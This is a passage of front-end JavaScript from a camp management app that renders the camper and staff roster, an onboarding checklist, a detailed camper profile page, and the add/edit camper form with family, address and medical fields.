        staffRows=staffRows.filter(function(r){return String(r.name||'').toLowerCase().includes(q)||String(r.role||'').toLowerCase().includes(q)});
    }
    camperEntries.sort(function(a,b){return a[0].localeCompare(b[0])});
    var total=camperEntries.length+staffRows.length;

    var h='<div class="sec-hd"><div><h2 class="sec-title">Roster</h2><p class="sec-desc">'+camperEntries.length+' camper'+(camperEntries.length!==1?'s':'')+(canStaff?' · '+staffRows.length+' staff':'')+'</p></div><div class="sec-actions"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.manageCustomFields()" title="Define custom fields">⚙ Custom Fields</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.downloadTemplate()">Template</button><button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.openCsv()">Import</button><button class="me-btn me-btn--pri" onclick="CampistryMe.addCamper()">+ Add Camper</button></div></div>';
    h+=_setupChecklistHtml();

    var unplaced=canStaff?hiredStaff().filter(function(a){return !String(a.email||'').trim()||!bunksForStaffEmail(a.email).length;}):[];
    if(unplaced.length){
        h+='<div style="background:#FFF7ED;border:1px solid #FED7AA;border-radius:var(--r);padding:10px 14px;margin-bottom:14px;font-size:.83rem;color:#9A3412">'
          +'<strong>'+unplaced.length+' hired '+(unplaced.length===1?'person is':'people are')+' not set up yet.</strong> '
          +'Open them from Registration &amp; Hiring to add an email and put them on a bunk — until then they can\'t sign in to Campistry Lite or receive notifications.</div>';
    }

    if(!total){
        h+='<div class="me-empty"><h3>No one here yet</h3><p>Add campers or import from CSV — or accept an application from Registration &amp; Hiring.</p><div style="display:flex;gap:6px;justify-content:center"><button class="me-btn me-btn--pri" onclick="CampistryMe.addCamper()">+ Add</button><button class="me-btn me-btn--sec" onclick="CampistryMe.openCsv()">Import</button></div></div>';
    }else{
        var combined=camperEntries.map(function(pair){return{kind:'camper',n:pair[0],d:pair[1]}}).concat(staffRows.map(function(r){return{kind:'staff',r:r}}));
        var paged=_paginate(combined,PAGE_SIZE,_rosterPage);
        h+='<div class="me-card"><div class="me-tw"><table class="me-t"><thead><tr><th style="width:76px">Type</th><th>Name</th><th>Details</th><th>Placement</th><th>Contact</th><th style="width:60px"></th></tr></thead><tbody>';
        paged.items.forEach(function(item){
            if(item.kind==='camper'){
                var n=item.n,d=item.d;
                var hasMed=!!(d.allergies||d.medications);
                var altN=[d.altFirstName,d.altLastName].filter(Boolean).join(' ');
                var fam=_familyForCamper(n);
                var famChip=fam?'<div style="margin-top:2px"><span style="font-size:.68rem;color:var(--me);font-weight:600;cursor:pointer" onclick="event.stopPropagation();CampistryMe.viewFamilyFromCamper(\''+je(n)+'\')">'+esc(fam.name)+'</span></div>':'';
                var nameCell=esc(n)+(altN&&getCampSettings().showAltNames!==false?'<div style="font-size:.7rem;color:var(--s400);font-weight:400">'+esc(altN)+'</div>':'')+famChip;
                var details=(d.schoolGrade?esc(d.schoolGrade):'<span style="color:var(--s300)">—</span>')+(hasMed?' <span style="color:var(--err);font-size:.7rem;font-weight:600">⚠ Medical</span>':'');
                var placement=(d.division?dtag(d.division):'<span style="color:var(--s300)">—</span>')+(d.bunk?' '+bdg(d.bunk,'gray'):'');
                var contact=(d.parent1Phone||d.parent1Email)?'<span style="font-size:.78rem;color:var(--s500)">'+esc(d.parent1Name||'')+'</span>':'<span style="color:var(--s300)">—</span>';
                h+='<tr class="click" onclick="CampistryMe.viewCamper(\''+je(n)+'\')"><td>'+_typeBadge('camper')+'</td><td class="bold">'+nameCell+'</td><td style="font-size:.8rem">'+details+'</td><td>'+placement+'</td><td>'+contact+'</td><td style="text-align:right" onclick="event.stopPropagation()"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.editCamper(\''+je(n)+'\')">Edit</button></td></tr>';
            }else{
                var r=item.r;
                var grade=_pplGradeForBunks(r.bunks);
                var pay=r.payRate?('$'+r.payRate+(r.payType?'/'+r.payType:'')):'';
                var details2=(r.role||(r.positions||[]).join(', ')||'<span style="color:var(--s300)">—</span>')+(pay?' <span style="color:var(--s400);font-size:.78rem">· '+esc(pay)+'</span>':'');
                var placement2=(grade?'<span style="font-size:.8rem">'+esc(grade)+'</span>':'<span style="color:var(--s300)">—</span>')+(r.bunks.length?' '+r.bunks.map(function(b){return bdg(b,'gray')}).join(' '):'');
                var contact2=((r.email?'<div style="font-size:.78rem;color:var(--s500)">'+esc(r.email)+'</div>':'')+(r.phone?'<div style="font-size:.75rem;color:var(--s400)">'+esc(r.phone)+'</div>':''))||'<span style="color:var(--s300)">—</span>';
                h+='<tr class="click" onclick="CampistryMe.viewStaffMember(\''+je(r._key)+'\')"><td>'+_typeBadge('staff')+'</td><td class="bold">'+esc(r.name)+'</td><td style="font-size:.8rem">'+details2+'</td><td>'+placement2+'</td><td>'+contact2+'</td><td style="text-align:right" onclick="event.stopPropagation()"><button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.openEditStaffModal(\''+je(r._key)+'\')">Edit</button></td></tr>';
            }
        });
        h+='</tbody></table></div>'+_pagerHtml(combined.length,PAGE_SIZE,_rosterPage,'setRosterPage')+'</div>';
    }
    c.innerHTML=h;
}
// Onboarding checklist — modeled on badges.js's BADGE_DEFS {id, check} shape.
// Shown at the top of Roster (the landing page) until every step is done or
// the owner dismisses it.
var SETUP_CHECKLIST=[
    {id:'structure',label:'Set up your camp structure — divisions, grades, and bunks',check:function(){return Object.keys(structure).length>0},action:function(){nav('structure')}},
    {id:'camper',label:'Add your first camper',check:function(){return Object.keys(roster).length>0},action:function(){addCamper()}},
    {id:'session',label:'Create a session on the Dashboard',check:function(){return sessions.length>0},href:'dashboard.html'},
    {id:'family',label:'Add a family / billing account',check:function(){return Object.keys(families).length>0},action:function(){nav('families')}}
];
function _setupChecklistHtml(){
    if(_setupChecklistDismissed)return '';
    var done=SETUP_CHECKLIST.filter(function(i){return i.check()});
    if(done.length===SETUP_CHECKLIST.length)return '';
    var pct=Math.round(done.length/SETUP_CHECKLIST.length*100);
    var h='<div class="me-card" style="padding:16px 18px;margin-bottom:16px;border:1px solid var(--s200)">';
    h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">';
    h+='<div><div style="font-weight:700;font-size:.92rem;color:var(--s800)">Getting Started</div><div style="font-size:.75rem;color:var(--s400);margin-top:2px">'+done.length+' of '+SETUP_CHECKLIST.length+' steps complete</div></div>';
    h+='<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.dismissSetupChecklist()" title="Dismiss">✕</button>';
    h+='</div>';
    h+='<div style="height:6px;background:var(--s100);border-radius:999px;overflow:hidden;margin-bottom:12px"><div style="height:100%;width:'+pct+'%;background:var(--me);border-radius:999px"></div></div>';
    h+='<div style="display:grid;gap:8px">';
    SETUP_CHECKLIST.forEach(function(item,i){
        var isDone=item.check();
        var inner='<span style="width:18px;height:18px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;background:'+(isDone?'var(--ok)':'var(--s100)')+';color:'+(isDone?'#fff':'var(--s400)')+'">'+(isDone?'✓':'')+'</span>'
            +'<span style="'+(isDone?'color:var(--s400);text-decoration:line-through':'color:var(--s700);font-weight:600')+'">'+esc(item.label)+'</span>';
        if(isDone){
            h+='<div style="display:flex;align-items:center;gap:8px;font-size:.82rem">'+inner+'</div>';
        }else if(item.href){
            h+='<a href="'+esc(item.href)+'" style="display:flex;align-items:center;gap:8px;font-size:.82rem;text-decoration:none;cursor:pointer">'+inner+'</a>';
        }else{
            h+='<div style="display:flex;align-items:center;gap:8px;font-size:.82rem;cursor:pointer" onclick="CampistryMe._runSetupChecklistAction('+i+')">'+inner+'</div>';
        }
    });
    h+='</div></div>';
    return h;
}
function _runSetupChecklistAction(idx){var item=SETUP_CHECKLIST[idx];if(item&&item.action)item.action();}
function dismissSetupChecklist(){_setupChecklistDismissed=true;save();render(curPage);}
// Camper profile — a full page (like CampMinder's camper record), not a
// modal: there's meaningfully more here than a quick popup should hold, and
// a dedicated page leaves room to grow (the same accordions below) without
// fighting a fixed modal height. viewCamper() just remembers which camper
// and navigates; renderCamperDetailPage() (wired into nav()'s page-render
// dispatch as 'camperdetail') does the actual rendering, the same way the
// Families page's scroll-to-camper highlight works off a remembered global
// instead of a function argument threaded through nav().
var _camperDetailName=null;
function viewCamper(n){
    if(!roster[n])return;
    _camperDetailName=n;
    nav('camperdetail');
}
// A compact, always-visible grid card — the practical counterpart to
// _accCard(): no click-to-expand, because the whole point of this page's
// layout is fitting the record on one screen instead of hiding pieces of
// it behind an accordion. opts.flag tints the card for the one section
// (Medical) where missing/flagged data needs to catch the eye immediately.
function _dpCard(title,bodyHtml,opts){
    opts=opts||{};
    var iconHtml=opts.icon?'<span style="display:inline-flex;color:'+(opts.flag?'var(--err)':'var(--me)')+'">'+ico(opts.icon)+'</span>':'';
    return '<div class="me-card" style="padding:18px 20px;'+(opts.flag?'border-left:3px solid var(--err)':'')+'">'
        +'<div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:10px">'
        +'<div style="display:flex;align-items:center;gap:7px;font-size:.7rem;font-weight:700;color:var(--s500);text-transform:uppercase;letter-spacing:.05em">'+iconHtml+esc(title)+(opts.badge?' <span style="font-weight:600;color:var(--s400)">'+esc(opts.badge)+'</span>':'')+'</div>'
        +(opts.actionHtml||'')
        +'</div>'+bodyHtml+'</div>';
}
function renderCamperDetailPage(){
    var c=document.getElementById('page-camperdetail');
    if(!c)return;
    var n=_camperDetailName;
    var d=n?roster[n]:null;
    if(!d){
        c.innerHTML='<div class="me-empty"><h3>Camper not found</h3><p>They may have been deleted or renamed.</p><button class="me-btn me-btn--sec" onclick="CampistryMe.nav(\'campers\')">← Back to Roster</button></div>';
        return;
    }
    var idStr=d.camperId?String(d.camperId).padStart(4,'0'):'—';
    var altName=[d.altFirstName,d.altLastName].filter(Boolean).join(' ');

    // A camper's photo (when one was uploaded on their application) lives on
    // the enrollment record, not the roster record — same lookup Registration's
    // own application review uses. Falls back to the initials avatar.
    function isSafeImageDataUrl(s){return typeof s==='string'&&/^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);}
    var _enr=_enrollmentForCamper(n);
    var avatarHtml=(_enr&&_enr.camperPhoto&&isSafeImageDataUrl(_enr.camperPhoto))
        ?'<img src="'+_enr.camperPhoto+'" style="width:52px;height:52px;object-fit:cover;border-radius:8px;flex-shrink:0">'
        :av(n,'l');

    // Compact header — same small-avatar-next-to-title shape every other
    // page in Me uses (.sec-hd), not a decorative banner, so it costs as
    // little vertical space as possible before the actual record starts.
    var h='<button class="me-btn me-btn--ghost me-btn--sm" style="margin-bottom:10px" onclick="CampistryMe.nav(\'campers\')">← Back to Roster</button>';
    h+='<div class="sec-hd"><div style="display:flex;align-items:center;gap:12px">'
        +avatarHtml
        +'<div><h2 class="sec-title">'+esc(n)+(altName?' <span style="font-weight:500;color:var(--s400);font-size:.85rem">('+esc(altName)+')</span>':'')+'</h2>'
        +'<p class="sec-desc">#'+esc(idStr)+(d.division?' · '+esc(d.division):'')+(d.bunk?' · '+esc(d.bunk):'')+'</p></div>'
        +'</div><div class="sec-actions">'
        +'<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.reEnrollCamper(\''+je(n)+'\')">Re-Enroll</button>'
        +'<button class="me-btn me-btn--sec" onclick="CampistryMe.editCamper(\''+je(n)+'\')">Edit</button>'
        +'<button class="me-btn me-btn--sm" style="background:var(--err);color:#fff;border:none" onclick="CampistryMe.deleteCamper(\''+je(n)+'\')">Delete</button>'
        +'</div></div>';

    var hasMedFlags=!!(d.allergies||d.medications||d.dietary||d.medicalNotes);
    if(hasMedFlags){
        h+='<div style="display:flex;align-items:center;gap:8px;background:rgba(220,38,38,.06);border:1px solid rgba(220,38,38,.2);border-radius:var(--r);padding:8px 12px;margin-bottom:14px;font-size:.8rem;font-weight:600;color:var(--err)">⚠ '+esc([d.allergies?'Allergies':'',d.medications?'Medications':''].filter(Boolean).join(' · ')||'Medical flags')+' on file — see Medical Summary</div>';
    }

    // ── Everything below is a grid of small always-open cards, not
    // accordions — the goal is to get as much of the record on screen at
    // once as a normal desktop viewport allows, not to hide detail behind
    // clicks. Columns pack as many 280px-minimum cards per row as fit.
    var g='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;align-items:start">';

    var personal=cvR('Camper ID','#'+idStr);
    if(d.dob){
        var dobStr=new Date(d.dob+'T12:00:00').toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'})+' (age '+age(d.dob)+')';
        if(getCampSettings().showHebrewDates){
            var hebDate=toHebrewDate(d.dob);
            if(hebDate) dobStr+=' · <span style="font-size:.85rem;color:var(--me)">'+hebDate+'</span>';
        }
        personal+=cvR('Date of Birth',dobStr);
    }
    personal+=cvR('Gender',d.gender)+cvR('School',d.school)+cvR('School Grade',d.schoolGrade)+cvR('Teacher',d.teacher);
    g+=_dpCard('Personal Information',personal,{icon:'user'});

    var camp=cvR('Division',d.division)+cvR('Grade',d.grade)+cvR('Bunk',d.bunk);
    var teams=d.teams||{};var teamKeys=Object.keys(teams);
    if(d.team&&!teamKeys.length)camp+=cvR('Team',d.team);
    else teamKeys.forEach(function(lg){camp+=cvR(lg,teams[lg])});
    if(d.camperType)camp+=cvR('Camper Type',esc(d.camperType));
    if(d.swimLevel)camp+=cvR('Swim Level',esc(d.swimLevel));
    if(d.shirtSize)camp+=cvR('Shirt Size',esc(d.shirtSize));
    var bunkReq=_camperBunkRequests(n);
    if(bunkReq.friends.length)camp+=cvR('Wants to bunk with',esc(bunkReq.friends.join(', ')));
    if(bunkReq.avoid.length)camp+=cvR('Do not bunk with','<span class="cv-warn">'+esc(bunkReq.avoid.join(', '))+'</span>');
    g+=_dpCard('Camp Assignment',camp,{icon:'mapPin'});

    var fam='';
    if(d.parent1Name){
        fam+=cvR('Parent',d.parent1Name);
        if(d.parent1Phone)fam+=cvR('Phone','<a href="tel:'+esc(d.parent1Phone)+'" style="color:var(--me);font-weight:600">'+esc(d.parent1Phone)+'</a>');
        if(d.parent1Email)fam+=cvR('Email','<a href="mailto:'+esc(d.parent1Email)+'" style="color:var(--me)">'+esc(d.parent1Email)+'</a>');
    }else{
        fam+='<div style="font-size:.8rem;color:var(--s400);font-style:italic;padding:2px 0">No parent info on file</div>';
    }
    if(d.emergencyName){
        fam+=cvR('Emergency',d.emergencyName+(d.emergencyRel?' ('+d.emergencyRel+')':''));
        if(d.emergencyPhone)fam+=cvR('Phone','<a href="tel:'+esc(d.emergencyPhone)+'" style="color:var(--me);font-weight:600">'+esc(d.emergencyPhone)+'</a>');
    }else{
        fam+='<div style="font-size:.8rem;color:var(--err);font-style:italic;padding:2px 0">⚠ No emergency contact</div>';
    }
    // Siblings — same household, one click to the other camper's own
    // record (CampMinder's "Unified Person Record" links siblings the
    // same way). Same family lookup the Families page's own detection
    // uses, just read here instead of on the Families page.
    var famEntry=Object.entries(families).filter(function(pair){return(pair[1].camperIds||[]).indexOf(n)>=0;})[0];
    var siblings=famEntry?(famEntry[1].camperIds||[]).filter(function(cn){return cn!==n;}):[];
    if(siblings.length){
        fam+='<div style="margin-top:8px;padding-top:8px;border-top:1px solid var(--s100)"><span class="cv-lbl" style="display:block;margin-bottom:4px">Siblings</span><div style="display:flex;flex-wrap:wrap;gap:5px">'
            +siblings.map(function(sn){return '<span style="display:inline-flex;align-items:center;padding:3px 9px;border-radius:999px;background:var(--s50);border:1px solid var(--s200);font-size:.76rem;font-weight:600;color:var(--me);cursor:pointer" onclick="CampistryMe.viewCamper(\''+je(sn)+'\')">'+esc(sn)+'</span>';}).join('')
            +'</div></div>';
    }
    g+=_dpCard('Family & Emergency Contact',fam,{icon:'users'});

    var addr='';
    if(d.street){
        var fullAddr=_addrJoin([d.street,d.city,d.state,d.zip]);
        addr+=cvR('Home',fullAddr);
        addr+='<a href="https://maps.google.com/?q='+encodeURIComponent(fullAddr)+'" target="_blank" style="display:inline-flex;font-size:.75rem;font-weight:600;color:var(--me);margin:2px 0 6px;text-decoration:none">Open in Maps →</a>';
    }else{
        addr+='<div style="font-size:.8rem;color:var(--s400);font-style:italic;padding:2px 0">No home address on file</div>';
    }
    if(d.summerSameAsHome===false&&d.summerStreet){
        addr+=cvR('Summer',_addrJoin([d.summerStreet,d.summerCity,d.summerState,d.summerZip]));
        if(d.summerPhone)addr+=cvR('Summer Phone',d.summerPhone);
    }
    g+=_dpCard('Address',addr,{icon:'home'});

    var med='';
    if(d.allergies)med+=cvR('Allergies',d.allergies,true);
    if(d.medications)med+=cvR('Medications',d.medications,true);
    if(d.dietary)med+=cvR('Dietary',d.dietary);
    if(d.medicalNotes)med+=cvR('Notes',esc(d.medicalNotes));
    if(!hasMedFlags)med+='<div style="font-size:.8rem;color:var(--ok);padding:2px 0">✓ No medical flags</div>';
    if(d.physician)med+=cvR('Physician',esc(d.physician)+(d.physicianPhone?' · '+esc(d.physicianPhone):''));
    if(d.insuranceProvider)med+=cvR('Insurance',esc(d.insuranceProvider)+(d.insurancePolicy?' · #'+esc(d.insurancePolicy):''));
    med+='<div class="cv-health" onclick="window.location.href=\'campistry_health.html\'">Open in Campistry Health →</div>';
    g+=_dpCard('Medical Summary',med,{flag:hasMedFlags,icon:'heart'});

    var docs=(d.documents||[]);
    g+=_dpCard('Documents',renderDocuments(n),{icon:'fileText',badge:docs.length?String(docs.length):'',actionHtml:'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.uploadDocument(\''+je(n)+'\')">+ Upload</button>'});

    var schols=d.scholarships||[];
    var aidBody=schols.length?schols.map(function(s){return cvR(s.type,fm(s.amount)+(s.source?' — '+s.source:'')+(s.date?' ('+s.date+')':''))}).join(''):'<div style="font-size:.8rem;color:var(--s400);font-style:italic">No aid on file</div>';
    g+=_dpCard('Financial Aid',aidBody,{icon:'dollarSign',badge:schols.length?String(schols.length):'',actionHtml:'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.addScholarship(\''+je(n)+'\')">+ Award</button>'});

    loadCustomFields();
    if(customFields.length){
        var cfBody=customFields.map(function(cf){return cvR(cf.label,d['cf_'+cf.id]||'<span style="color:var(--s300)">—</span>')}).join('');
        g+=_dpCard('Custom Fields',cfBody,{icon:'list'});
    }

    var noteCount=(d.notes||[]).length;
    g+=_dpCard('Notes & Timeline',renderCamperTimeline(n),{icon:'messageSquare',badge:noteCount?String(noteCount):'',actionHtml:'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.addCamperNote(\''+je(n)+'\')">+ Add Note</button>'});

    g+=_dpCard('History',renderCamperHistory(n),{icon:'clock'});

    g+='</div>';

    c.innerHTML='<div style="max-width:1400px;margin:0 auto">'+h+g+'</div>';
}
function cvR(l,v,w){if(!v)return'';return'<div class="cv-row"><span class="cv-lbl">'+esc(l)+'</span><span class="cv-val'+(w?' cv-warn':'')+'">'+v+'</span></div>'}
// Joins address parts with ", " — trims each part and strips any trailing
// comma a part might already carry (e.g. a street typed as "123 Main St,")
// so two commas never land back to back.
function _addrJoin(parts){
    return parts.map(function(p){return String(p||'').trim().replace(/,+$/,'')}).filter(Boolean).join(', ');
}

// Camper edit
function editCamper(n){
    editingCamper=n;
    var d=n?roster[n]||{}:{};var parts=(n||'').split(' ');
    var titleEl=document.getElementById('ceTitle');
    if(titleEl)titleEl.textContent=n?'Edit Camper':'Add Camper';
    var idStr=d.camperId?String(d.camperId).padStart(4,'0'):'Will be assigned on save';
    var h='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><div class="fsec" style="margin:0">Identity</div><span style="font-family:monospace;font-size:.8rem;color:var(--s400);background:var(--s100);padding:3px 10px;border-radius:var(--r)">Camper ID: #'+esc(idStr)+'</span></div>';
    h+='<div class="fr">'+ff('First Name','ceFirst',parts[0]||'')+ff('Last Name','ceLast',parts.slice(1).join(' ')||'')+'</div>';
    h+='<div class="fr">'+ff('Alternate First Name','ceAltFirst',d.altFirstName||'')+ff('Alternate Last Name','ceAltLast',d.altLastName||'')+'</div>';
    h+='<p style="font-size:.65rem;color:var(--s400);margin:-4px 0 8px;padding-left:2px">Hebrew, Spanish, Chinese, or any other name used at camp</p>';
    h+='<div class="fr">'+ff('Date of Birth','ceDob',d.dob||'','date')+ff('Gender','ceGender',d.gender||'','select',['','Male','Female','Non-binary','Other'])+'</div>';
    h+='<div class="fr">'+ff('School Name','ceSchool',d.school||'')+ff('School Grade','ceSchoolGr',d.schoolGrade||'','select',_schoolGradeOptions(d.schoolGrade))+'</div>';
    h+=ff('Teacher','ceTeacher',d.teacher||'');

    h+='<div class="fsec">Camp Assignment</div>';
    if(!Object.keys(structure).length){h+='<div style="background:var(--warn-bg,#fff8e1);border:1px solid var(--warn-border,#ffe082);border-radius:var(--r);padding:10px 14px;margin-bottom:10px;font-size:.8rem;color:var(--s600,#555)"><strong>No camp structure yet.</strong> Go to <a href="#" onclick="event.preventDefault();CampistryMe.closeModal(\'camperEditModal\');CampistryMe.nav(\'structure\')" style="color:var(--me);font-weight:600">Camp Structure</a> to create divisions, grades, and bunks first — or <a href="#" onclick="event.preventDefault();CampistryMe.closeModal(\'camperEditModal\');CampistryMe.openCsv()" style="color:var(--me);font-weight:600">import a CSV</a> which will create them automatically.</div>'}
    h+='<div class="fr">'+ff('Division','ceDiv',d.division||'','select',[''].concat(Object.keys(structure).sort()))+ff('Grade','ceCGrade',d.grade||'','select',grOpts(d.division))+'</div>';
    h+=ff('Bunk','ceBunk',d.bunk||'','select',bkOpts(d.division,d.grade));

    // Multi-league teams
    var leagues=getLeagues();var leagueNames=Object.keys(leagues).sort();
    var curTeams=d.teams||{};
    if(d.team&&!Object.keys(curTeams).length&&leagueNames.length){curTeams[leagueNames[0]]=d.team}
    h+='<div class="fsec">League Teams</div>';
    if(!leagueNames.length){h+='<p style="font-size:.8rem;color:var(--s400)">No leagues configured yet. Set up leagues in <a href="flow.html" style="color:var(--me);font-weight:600">Campistry Flow</a>.</p>';h+=ff('Team (legacy)','ceTeamLegacy',d.team||'')}
    else{
        h+='<div id="ceTeamRows">';
        leagueNames.forEach(function(lg){
            var teams=leagues[lg]||[];
            var cur=curTeams[lg]||'';
            h+='<div class="fr" style="align-items:flex-end;margin-bottom:6px"><div class="fg" style="flex:1"><label class="fl">'+esc(lg)+'</label><select class="fs ceTeamSel" data-league="'+esc(lg)+'"><option value="">— No team —</option>'+teams.map(function(t){return'<option value="'+esc(t)+'"'+(t===cur?' selected':'')+'>'+esc(t)+'</option>'}).join('')+'</select></div></div>';
        });
        h+='</div>';
    }

    h+='<div class="fsec">Parent / Guardian</div>';
    h+='<div class="fr">'+ff('Parent 1 Name','ceP1',d.parent1Name||'')+ff('Phone','ceP1Ph',d.parent1Phone||'')+'</div>';
    h+=ff('Email','ceP1Em',d.parent1Email||'','email');

    // Home vs summer address. Plenty of camp families spend the season at a
    // bungalow or a rental, so mail, transport and emergency contact all need
    // the summer address — while billing and records still key off home.
    h+='<div class="fsec">Home Address</div>';
    h+=ff('Street Address','ceStreet',d.street||'');
    h+='<div class="fr">'+ff('City','ceCity',d.city||'')+ff('State','ceState',d.state||'')+ff('ZIP','ceZip',d.zip||'')+'</div>';

    h+='<div class="fsec">Summer Address</div>';
    h+='<div class="fg"><label class="fl" style="display:flex;align-items:center;gap:7px;cursor:pointer">'+
        '<input type="checkbox" id="ceSummerSame"'+(d.summerSameAsHome!==false?' checked':'')+' onchange="CampistryMe.ceToggleSummer()"> Same as home address</label>'+
        '<p style="font-size:.68rem;color:var(--s400);margin:2px 0 0">Where the family is during the season — a bungalow, a rental, or with relatives.</p></div>';
    h+='<div id="ceSummerBlock" style="'+(d.summerSameAsHome!==false?'display:none':'')+'">';
    h+=ff('Street Address','ceSummerStreet',d.summerStreet||'');
    h+='<div class="fr">'+ff('City','ceSummerCity',d.summerCity||'')+ff('State','ceSummerState',d.summerState||'')+ff('ZIP','ceSummerZip',d.summerZip||'')+'</div>';
    h+=ff('Summer phone','ceSummerPhone',d.summerPhone||'','tel');
    h+='</div>';

    h+='<div class="fsec">Emergency Contact</div>';
    h+='<div class="fr">'+ff('Name','ceEmN',d.emergencyName||'')+ff('Phone','ceEmPh',d.emergencyPhone||'')+'</div>';
    h+=ff('Relation','ceEmR',d.emergencyRel||'');

    h+='<div class="fsec">Medical (quick glance)</div>';
    h+='<div class="fr">'+ff('Allergies','ceAlg',d.allergies||'')+ff('Medications','ceMed',d.medications||'')+'</div>';
    h+=ff('Dietary Restrictions','ceDiet',d.dietary||'');
    h+=ff('Medical Notes','ceMedNotes',d.medicalNotes||'');
    h+='<div class="fr">'+ff('Physician','cePhys',d.physician||'')+ff('Physician Phone','cePhysPh',d.physicianPhone||'')+'</div>';
    h+='<div class="fr">'+ff('Insurance Provider','ceInsProv',d.insuranceProvider||'')+ff('Policy #','ceInsPol',d.insurancePolicy||'')+'</div>';

    h+='<div class="fsec">More Details</div>';
    h+='<div class="fr">'+ff('Camper Type','ceType',d.camperType||'','select',['','New','Returning'])+ff('Swim Level','ceSwim',d.swimLevel||'','select',['','Non-swimmer','Beginner','Intermediate','Advanced'])+'</div>';
    h+='<div class="fr">'+ff('Shirt Size','ceShirt',d.shirtSize||'','select',['','YS','YM','YL','AS','AM','AL','AXL','AXXL'])+ff('Bunkmate Request','ceBunkmate',d.bunkmateRequest||'')+'</div>';
    h+=ff('Do Not Bunk With','ceSeparate',d.separateFrom||'');

    var ceBodyEl=document.getElementById('ceBody');
    if(ceBodyEl)ceBodyEl.innerHTML=h;
    // Cascade
    var divS=document.getElementById('ceDiv'),grS=document.getElementById('ceCGrade'),bkS=document.getElementById('ceBunk');
    if(divS)divS.onchange=function(){if(grS)grS.innerHTML=grOpts(divS.value).map(function(o){return'<option value="'+esc(o)+'">'+(o||'—')+'</option>'}).join('');if(bkS)bkS.innerHTML=bkOpts(divS.value,'').map(function(o){return'<option value="'+esc(o)+'">'+(o||'—')+'</option>'}).join('')};
    if(grS)grS.onchange=function(){if(bkS)bkS.innerHTML=bkOpts(divS.value,grS.value).map(function(o){return'<option value="'+esc(o)+'">'+(o||'—')+'</option>'}).join('')};
    var saveBtn=document.getElementById('ceSave');
    if(saveBtn)saveBtn.onclick=saveCamper;
    openModal('camperEditModal');
}
function ceToggleSummer(){
    var on=document.getElementById('ceSummerSame'), b=document.getElementById('ceSummerBlock');
    if(b)b.style.display=(on&&on.checked)?'none':'';
}
function addCamper(){editingCamper=null;editCamper('')}
function saveCamper(){
    var first=(document.getElementById('ceFirst').value||'').trim(),last=(document.getElementById('ceLast').value||'').trim();
    if(!first){toast('First name required','error');try{document.getElementById('ceFirst').focus()}catch(_){}return}
    var full=first+(last?' '+last:'');
    // ★ #4 rename-collision guard: renaming onto a DIFFERENT existing camper would
    // silently OVERWRITE them at roster[full] below (delete old key, then assign new).
    // Reject instead of clobbering an existing record.
    if(editingCamper&&editingCamper!==full&&roster[full]){toast('A camper named "'+full+'" already exists','error');return}
    var existingId=(editingCamper&&roster[editingCamper])?roster[editingCamper].camperId:null;
    // Snapshot the old record BEFORE any delete so we can (a) preserve fields this
    // form doesn't manage (notes, documents, custom fields, scholarships, history)
    // and (b) diff it for the change log.
    var _oldRec=editingCamper?Object.assign({},roster[editingCamper]||{}):{};
    // Capture the parent email BEFORE we overwrite it, so an email change can be
    // migrated onto the existing invite in place (fix b) rather than orphaning it.
    var _oldParentEmail=(editingCamper&&roster[editingCamper]&&roster[editingCamper].parent1Email)?String(roster[editingCamper].parent1Email).trim():'';
    // ★ #4 cascade: roster keys are NAMES, and families[].camperIds / bunkAsgn[bunk] /
    // payments[].camper / Campistry-Go addresses all reference campers BY NAME. On a
    // rename we must update those refs or the camper is silently detached from their
    // family, bunk assignment, and billing.
    if(editingCamper&&editingCamper!==full){cascadeCamperRename(editingCamper,full);delete roster[editingCamper]}
    if(!editingCamper&&roster[full]){toast('Already exists','error');return}
    // Gather teams
    var teams={};document.querySelectorAll('.ceTeamSel').forEach(function(sel){var lg=sel.dataset.league,v=sel.value;if(lg&&v)teams[lg]=v});
    if(!existingId){existingId=nextCamperId;nextCamperId++}
    function _v(id){var el=document.getElementById(id);return el?(el.value||''):'';}
    var _summerSameEl=document.getElementById('ceSummerSame');
    var _summerSame=_summerSameEl?!!_summerSameEl.checked:true;
    var _core={
        camperId:existingId,
        altFirstName:_v('ceAltFirst').trim(),
        altLastName:_v('ceAltLast').trim(),
        dob:_v('ceDob'),gender:_v('ceGender'),
        school:_v('ceSchool'),schoolGrade:_v('ceSchoolGr'),
        teacher:_v('ceTeacher'),
        division:_v('ceDiv'),grade:_v('ceCGrade'),
        bunk:_v('ceBunk'),
        teams:teams,team:Object.values(teams)[0]||_v('ceTeamLegacy'),
        street:_v('ceStreet'),city:_v('ceCity'),
        state:_v('ceState'),zip:_v('ceZip'),
        // "Same as home" is stored as the flag AND a copy of the home values,
        // so anything reading summerStreet directly (print sheets, Go, Link)
        // gets a real address without having to know about the flag.
        summerSameAsHome:_summerSame,
        summerStreet:_summerSame?_v('ceStreet'):_v('ceSummerStreet'),
        summerCity:_summerSame?_v('ceCity'):_v('ceSummerCity'),
        summerState:_summerSame?_v('ceState'):_v('ceSummerState'),
        summerZip:_summerSame?_v('ceZip'):_v('ceSummerZip'),
        summerPhone:_v('ceSummerPhone'),
        parent1Name:_v('ceP1'),parent1Phone:_v('ceP1Ph'),
        parent1Email:_v('ceP1Em'),
        emergencyName:_v('ceEmN'),emergencyPhone:_v('ceEmPh'),
        emergencyRel:_v('ceEmR'),
        allergies:_v('ceAlg'),medications:_v('ceMed'),
        dietary:_v('ceDiet'),medicalNotes:_v('ceMedNotes'),
